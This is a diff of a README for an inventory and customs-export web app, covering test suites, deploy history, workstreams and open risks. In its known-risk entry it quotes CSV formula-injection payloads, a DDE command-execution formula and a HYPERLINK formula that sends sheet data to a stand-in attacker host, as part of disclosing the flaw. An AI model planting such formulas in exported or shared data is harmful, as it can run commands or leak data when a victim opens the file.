-**Browser-UI checks — OPR (Playwright + real Chromium)**: `opr-ui.spec.mjs` (30 checks, all passing) drives the full OPR lifecycle through the real SPA: create an export consignment via the modal → scan two devices (Enter-to-scan) → a junk IMEI is rejected with the **server's** error toast and provably adds no row → validation panel → finalise with an MRN → pre-alert **send** surfaces the `gmail_not_configured` 503 honestly and the email outbox is proven to stay empty → linked import consignment → return scan → repair-invoice card (C&E1154 inputs) saved → receive → restock ("Restocked 1") — with API cross-checks that device A is back to `ACTIVE_INVENTORY` while device B (partial return) is still `EXPORTED_UNDER_OPR` — → discharge tracker row reads 2 exported / 1 returned / 1 outstanding, status open; zero page JS errors across the whole flow. Verified-can-fail: the scan error branch was replaced with a lying success toast → exactly the junk-IMEI check failed → revert sha1-identical. All test rows cleaned from local D1 afterwards.
-
-- **`test/csvExport.spec.ts`** (30 tests, added 2026-07-28) — `GET /api/devices/export/csv`, the last item that was still "manual/live-verified only". A CSV export is an **audit artefact**: if it silently omits or mangles rows, nobody can tell by looking at the file, so every test asserts the exact bytes rather than just a 200. Three defect classes are locked out. **(1) Silent wrong answers — three real bugs found and fixed while writing this suite:** a misspelled status (`?status=RECIEVED`, a very plausible typo) used to return a headers-only 200 CSV that is visually indistinguishable from "you have no devices in that state" — now a `400 Invalid status value(s)`; a non-numeric entry in `?ids=` was silently discarded by `.map(Number).filter(Boolean)`, so `?ids=12,abc,13` exported 2 of the 3 rows the operator had selected — now a `400` naming the invalid entry (`0`/negative likewise); and the 5000-row `LIMIT` truncated without a word — now counted first and refused with `413` carrying the true total, because a truncated audit file is worse than no file. An invalid `?source=` is a 400 for the same reason, `?status=` accepts a comma-separated list for parity with `GET /api/devices`, and a new `X-Export-Row-Count` header lets a caller cross-check it received every row the server counted. **(2) Structural corruption:** values containing a comma, a `"`, an LF **or a bare CR** are RFC 4180 quoted — the CR case was a genuine bug (the old regex tested `["\n,]` only, and a lone `\r` is a record terminator to Excel, so one device became two malformed rows); records are CRLF-delimited with no trailing separator, and each record is parsed with a real quote-aware parser and asserted to be exactly 16 fields, so no value can shift a column. NULLs render as empty fields, never `"null"`. Field values are compared against the **DB row** rather than the seeded literals, which is what catches a column-shift. **(3) Cross-tenant leakage:** a second organisation's device is absent on the status path and absent even when its id is named explicitly, and the same id set returns each org only its own row. Verified-can-fail ×5 (14 targeted failures total): removing the status enum guard → 2 fails; restoring the silent id-drop → 2; dropping the org scoping → 4; removing CSV quoting entirely → 4; un-escaping `\r` → 1. Every revert confirmed sha1-identical (`eb02e4f…`). **One honest correction to record:** the CR test as first written *passed under sabotage* — it asserted a CRLF-split row count, which by construction cannot observe a lone `\r`. It was rewritten to assert the quoting itself and only then did it genuinely fail, so this proof is real rather than decorative.
-
-- **`test/repairWorkflow.spec.ts`** (30 tests, 23 passing + 7 skipped — Device Lifecycle slice 1, Workstream C/D) — the in-house repair workflow (`startRepair`/`scanBackRepair`/`recordQc`/`reopenRepair`/`recordRepairCost` in `src/lib/repairWorkflow.ts`) and the `READY_FOR_ZOHO` gate that feeds the (not-yet-built) Zoho upload queue. Group C (`#15–29`, start/scan-back/QC/reopen/cost-recording) is green. `checkReadyForZohoGate()`'s six conditions are covered, including the **sixth condition** (SKU grade-suffix parsing — the SKU's final hyphen-delimited segment must be exactly `A`/`B`/`C`, case-sensitive): `#24`/`#25` only ever exercised the *accept* path (fixture default grade `-A` never trips the reject branch — a green test around an untriggered branch proves nothing about the reject side), so **five new failing-path tests were added this pass** — `#25a` (`-UG` rejected, parsed grade named in the message), `#25b` (a 7-segment SKU, asserting the parser reads the *last* segment rather than a fixed position — proven with a test-seeded catalog SKU `APL-I17-PRO-MAX-256-BLK-A`/`-UG`), `#25c` (unrecognised suffix `-X` rejected), `#25d` (no-grade-segment / no-hyphen SKUs rejected without throwing), `#25e` (lowercase `-a` rejected — case-sensitivity is a documented, deliberate decision, not an oversight). **Group D (`#30–36`, Zoho batch generation + confirmation) is `describe.skip`ped** with a stated reason in the skip label itself: Zoho batch upload was never built and was parked by explicit owner decision (stock currently goes into Zoho by hand) — carrying permanent reds made the board unreadable, so an honest skip replaces a misleading red. `#37` (ERP-webhook absence) stays unskipped since it asserts an absence against already-existing code, so it's genuinely green rather than blocked on unbuilt routes. Schema: migrations `0021` (status enum: `IN_HOUSE_REPAIR`/`QC_FAILED`/`READY_FOR_ZOHO`, no generic `HOLD`) and `0022` (`repair_jobs` table + Zoho queue scaffold). See `docs/plan/device-lifecycle-slice1.md` for the full design record.
-
-**Manual/live verification (not yet automated)**: none outstanding — auth 401s are asserted in `auth.spec.ts` and the CSV export shape now has the dedicated suite above (it was additionally re-smoked with live `curl` against the running instance: 401 unauthenticated, correct `Content-Type`/`Content-Disposition`/`X-Export-Row-Count`, and the three new 400s). The webhook `X-Signature` HMAC and IMEI/serial validation, formerly in this list, are covered by the OPR 4 suite and `validate.spec.ts` respectively.
-
-## Active Workstreams (as of 2026-08-21)
-
-**Deploy-hold posture**: production is on commit `f6de852` (deployed
-2026-08-21, 16:11 UTC via an approved `gsk hosted deploy` action, 32/32
-migrations in `migrations/` applied — see **Production deploy** above and
-the "DEPLOYED" section of `.deploy-checks/g5-phase2-live-half.md` for the
-full verification). This paragraph previously said production was on
-`6cbe4e2` (deployed 2026-08-11, 22/22 migrations) with `main` having since
-moved ahead via `f51ad4f`/`59728d8` and no deploy authorised — that gap is
-now closed: the ten-file batch (`0023a`–`0023c`, `0024`–`0029`, `0031`) that
-had been sitting in `migrations/` unshipped has been deployed, along with
-all `main` commits up to and including `f6de852`. Only `migrations-held/
-0030_...sql` remains withheld (needs renumbering before restoration, see
-`migrations-held/README.md`); no other pending deploy exists as of this
-
-> **CORRECTION (2026-09-08) — this posture paragraph is itself now stale,
-> exactly the pattern its own `sku_catalog` correction above warns about.**
-> At least two more deploys have shipped since `f6de852`: `89fb02b` (H0 fix,
-> 2026-09-07, `.deploy-checks/pre-0029-export.md`) and the commit backing
-> today's CSV-export deploy, `aae5b1f` (`.deploy-checks/csv-export-deploy-2026-09-08.md`).
-> Live-asset hash-match (curl production `/static/app.js`, sha256
-> `e45e4afdb4688dcd73504293bc5eff5982976d124e7588abd29702000192fd99`) matches
-> `git show aae5b1f:public/static/app.js` and `HEAD`'s copy of the same file
-> byte-for-byte, and `f6de852` is a confirmed ancestor of `aae5b1f` (28 commits
-> back) — so **production's frontend is provably at `aae5b1f` or a later
-> no-app.js-change deploy, not `f6de852`.** No authenticated production API
-> call was made to corroborate this (the only two real per-person accounts are
-> off-limits as fixtures); this is a source-level proof, not a live-endpoint
-> proof. A hash cited elsewhere as `6a9810a4` does not exist in this repo's git
-> history and could not be reconciled — flagged rather than guessed at. Trust
-> `.deploy-checks/*.md` and the hash-match method over this paragraph's prose
-> until it is rewritten against a fresh live check.
-pass.
-
-**Live corroboration (2026-08-21, superseded same day by the deploy below)**
-— see `.deploy-checks/g5-phase2-live-half.md` for the full record. Before
-the deploy, the `6cbe4e2` claim above had never been checked from a live
-session (the account authenticated in earlier passes had zero D1 resources
-and no matching project). A live session under the correct account
-(`saigateslimited@gmail.com`) confirmed at that time: production's
-`d1_migrations` table had exactly 22 rows, last entry
-`0022_repair_jobs_and_zoho_queue.sql`; `repair_jobs` and
-`zoho_batch_devices` were both live-confirmed 0 rows; the `0031` collision
-query returned zero groups live; and the deployed static bundle
-byte-matched this repo's copy at every commit from `5978311` through
-`6cbe4e2`. This corroboration work is what the same-day deploy (below) was
-gated behind — it is retained here as the historical record of the
-pre-deploy state, not the current one.
-
-**How the ten held migrations apply, and what "the atomicity question"
-meant going into the 2026-08-21 deploy (reconciled 2026-08-21, resolved by
-the deploy itself later the same day):** `gsk hosted deploy` was confirmed
-to be the ONLY mechanism that applies pending migrations for this project —
-no separate `d1_migrate` subcommand exists, and production's own
-`d1_migrations` timestamps (0018/0019/0020 sharing one timestamp,
-0021/0022 sharing another) were direct evidence that one deploy action
-applies a whole batch of previously-unapplied files together. **The ten
-"held" files were not held out of `migrations/` at all** — only `0030`
-was physically moved to `migrations-held/`; `0023a`/`0023b`/`0023c`,
-`0024`-`0029`, and `0031` all sat inside `migrations/`, so any deploy, for
-any reason, would ship all ten — which is exactly what then happened,
-deliberately and with explicit go-ahead, at 16:11 UTC the same day (see
-the "DEPLOYED" section of `.deploy-checks/g5-phase2-live-half.md`). The
-atomicity concern this section narrowed to — D1's HTTP API having no
-atomic multi-statement DDL, so the batch is ten independent auto-commit
-operations, not one transaction — did not materialise as a defect: the
-deploy log showed all ten files ✅ with no `execution_failed` and no
-partial-DDL `statement_index`, and post-deploy direct queries (no leftover
-`_old`/`_new` tables, zero orphaned `shipment_lines` rows) independently
-confirmed a clean, complete migration. See `.deploy-checks/
-g5-phase2-live-half.md`'s "How the ten held migrations apply" section for
-the pre-deploy reconciliation and its "DEPLOYED" section for the outcome.
-
-Two workstreams are active in parallel and are kept strictly
-separate (a change in one must never touch the other):
-
-1. **OPR Auth Batch** — CHIEF→OPR authorisation-number rename (migration
-   `0018`, done) + three new not-yet-built features (exchange-rate-month
-   field, stale-rate guard, expiry warnings at 180/90 days before the
-   authorisation's `valid_to`) + a supervising-office **record correction**
-   (`GBNCL001` → `GBLIV002`, reference-only, not a customs filing) + three
-   independent "safe-ground" tickets already committed locally: **Ticket A**
-   (AED added to the repair-invoice currency dropdown), **Ticket B**
-   (goods-value reconciliation + permanent delta trail, migration `0019`),
-   **Ticket C** (communication tracker — send/receive log, 3-working-day
-   follow-up flag, outstanding-items checklist, migration `0020`). Deploy of
-   this batch is auto-authorised once a strict six-point pre-flight
-   checklist is all-green (golden C&E1154 test, full suite, `tsc`,
-   production D1 backup-and-restore-tested, migration replay against a prod
-   schema copy, post-deploy verification query) — not yet triggered.
-2. **Device Lifecycle slice 1** — repair-workflow + Zoho upload-queue tests
-   (`#15–37`), schema (migrations `0021`/`0022`) and `src/lib/repairWorkflow.ts`
-   + `src/routes/devices.ts` implementation now exist. Group C (`#15–29`,
-   start/scan-back/QC/reopen/cost-recording, including the six
-   `checkReadyForZohoGate()` conditions) is green, with **five new
-   failing-path tests (`#25a–#25e`) added this pass** to actually exercise
-   gate condition 6's reject branch (SKU grade-suffix parsing — final
-   hyphen-delimited segment must be exactly `A`/`B`/`C`, case-sensitive),
-   which the original `#24`/`#25` never triggered. **Group D (`#30–36`, Zoho
-   batch generation/confirmation) is `describe.skip`ped** — Zoho batch
-   upload was never built and was parked by explicit owner decision (stock
-   currently goes into Zoho by hand); `#37` (ERP-webhook absence) stays
-   green since it asserts an absence, not an unbuilt route. See
-   `docs/plan/device-lifecycle-slice1.md` for the full design resolution
-   (confirmed 7-field GBP-only repair-cost fields, `QC_FAILED` with
-   mandatory reason, no generic `HOLD`, `READY_FOR_ZOHO` only after a
-   PASSED QC) and **Testing** above for the current pass/skip breakdown.
-
-**Future (not yet started, documentation/scope only)**: a staged **Zoho
-replacement & integrated inventory + accounting connection** — build
-inventory/purchasing to full trust (including a new create-a-bill flow,
-VAT type on the bill) → run parallel with Zoho to prove data integrity →
-rehome Back Market → rehome Amazon as its own scoped project (the gate for
-switching Zoho off) → later, separately, connect the firm's own accounting
-system. Confirmed fact: **Zoho is not the VAT/accounting book of record**,
-so this replacement carries no live VAT-return risk. Design requirement
-baked in from day one: the VAT type on the bill, the bill itself, and the
-purchase cost are an **audited, non-overwritable financial record** (append
--only correction pattern, same discipline as `shipment_value_deltas`). Full
-detail: `docs/plan/zoho-replacement-roadmap.md`. This is explicitly
-**not** part of either active workstream above and is not authorised for
-implementation by that document.
+| File | Status |
+|---|---|
+| `z2-acquisition-cost.md` | **Implemented and merged.** Acquisition/total cost computation design — see **Cost Model** above. |
+| `device-lifecycle-slice1.md` | Repair workflow + Zoho upload-queue gate design. Group C (start/scan-back/QC/reopen/cost) is built and green; Group D (batch upload) is parked. |
+| `zoho-replacement-roadmap.md` | **Scope/documentation only, not authorised for implementation.** Staged plan to eventually replace Zoho as the accounting book of record. |
+| `v6-amazon-cost-feed.md` | **Scoped, not built.** Sprint 2 item (opens 9 Oct), unblocked by Z-5. Amazon read-only cost feed — exclusion filter must key off `OPR_WORKFLOW_ONLY_STATUSES` directly, never the display-only `deviceLocation()` helper. |
+| `z15-return-completeness-gate.md` | **Scoping only.** Finalisation-block design for partial-return completeness. |
+| `z16-convention-drift.md` | **Standing tracking note**, not a ticket — recurring failure mode where a comment/test/log states a fact that goes stale unnoticed. Currently at thirteen logged instances. |
+| `z20-gate-reliability.md` | **Scoping only**, Sprint 2. Opened after three consecutive full-suite runs in one pass produced three different results — standing response is an inventory of every test within a margin of its timeout (report first, decide fixes after), plus a folded-in production-latency check on OPR's sequential bulk-write endpoint against the Worker's real CPU-time budget. |
 
 ## Not Yet Implemented / Next Steps
-- ~~Automated coverage for CSV export shape~~ — **done 2026-07-28** (`test/csvExport.spec.ts`, 30 tests; three silent-wrong-answer bugs found and fixed in the process — see **Testing** above).
-- ⚠️ **KNOWN RISK, LIVE TODAY — CSV formula injection in `GET /api/devices/export/csv`.** Not a "future improvement": this is an unmitigated vulnerability in shipping code. Cell values are written byte-faithfully, so **any device field whose value begins `=`, `+`, `-` or `@` is a live formula the moment the exported file is opened in Excel, LibreOffice or Google Sheets — it executes on open**, with no prompt for `=`-prefixed content in many configurations. The classic payloads are `=cmd|'/c calc'!A0` (command execution via DDE) and `=HYPERLINK("http://attacker/?"&A1)` / `=WEBSERVICE(...)` (silent exfiltration of the sheet's contents). **Reachability:** it is only exploitable if an attacker-influenced string can land in an exported column — today those columns come from manifest CSVs supplied by suppliers and from operator-typed model/notes/reference fields, so the manifest-upload path is the realistic vector, not a hypothetical one. **Why it is still open rather than patched:** the usual mitigation (prefixing a `'` or a space) silently rewrites the stored value, and this file is an HMRC audit artefact — a mutated IMEI, reference or valuation is a worse failure than the injection. **The fix, when it is done, is a typed `.xlsx` export** (SheetJS/ExcelJS writing each cell with an explicit `t: 's'` string type), which carries the type in the file format so the value is preserved exactly *and* can never be evaluated. Until that exists: **treat every exported CSV as untrusted input** — open it in a viewer that does not evaluate formulas, or import it with all columns forced to Text — and do not forward one to HMRC or a customer without that check.
-- Grading workflow (next stage after Goods In).
-- QZ Tray local-WebSocket bridge (alternative to PrintNode for sites that don't want cloud printing).
-- ~~Real credential-based login~~ — **done 2026-07-28** for the two-person internal case (per-person PBKDF2 credentials, dev-login removed). Still honestly out of scope: external IdP / SSO / Cloudflare Access, self-signup, email verification, email-based password reset, multi-org, and `?token=` print-URL hardening.
-- `SOLD` lifecycle transition — deliberately unwired; belongs to a downstream sales flow, not OPR.
-- **Real Gmail credentials + first live send** — OPR 4's send endpoints are wire-proven against a stubbed Gmail API and refuse 503 until `GMAIL_CLIENT_ID`/`GMAIL_CLIENT_SECRET`/`GMAIL_REFRESH_TOKEN` are configured as Wrangler secrets. No real email has ever been sent; verify the first live send when credentials exist.
-- Grading — explicitly out of scope.
+- ⚠️ **KNOWN RISK, LIVE TODAY — CSV formula injection in `GET /api/devices/export/csv`.** Any device field value beginning `=`, `+`, `-` or `@` is a live formula the moment the exported CSV is opened in Excel/Sheets. Not yet mitigated because the usual fix (prefixing a quote) would mutate an HMRC audit artefact. Planned fix: a typed `.xlsx` export. Until then, treat every exported CSV as untrusted — open with formulas disabled or force all columns to Text.
+- **Real Gmail credentials + first live send** — OPR correspondence send endpoints are wire-proven against a stubbed Gmail API only; no real email has ever been sent.
+- Grading workflow beyond the current A+–D/UG scale — explicitly out of scope.
 - Multi-warehouse / multi-location.
-- CSV **import** for suppliers (only export exists today — see `GET /api/devices/export/csv`).
-- Real-time multi-user updates (websocket / SSE on `scan_events` / `device_events`).
-- User-management UI (users/organisations are currently seeded directly in D1, no CRUD screens).
-- OpenAPI spec — a machine-readable description of the API table above (see `openapi.yaml` in the project root).
+- CSV **import** for suppliers beyond the manifest-upload path (only export + manifest-upload exist today).
+- Real-time multi-user updates (websocket/SSE on scan/device events).
+- User-management UI — users/organisations are seeded directly in D1, no CRUD screens.
+- OpenAPI spec — `openapi.yaml` exists in the project root as a starting point but is not kept in lockstep with the live route table above; treat this README's route table as the more current source until that's resolved.
+- External IdP/SSO, self-signup, email verification, email-based password reset, multi-org — all deliberate non-goals for the current two-person internal use case.
+- `v6-amazon-cost-feed.md`, `z15-return-completeness-gate.md`, `z20-gate-reliability.md` — all scoped, none built. See table above.
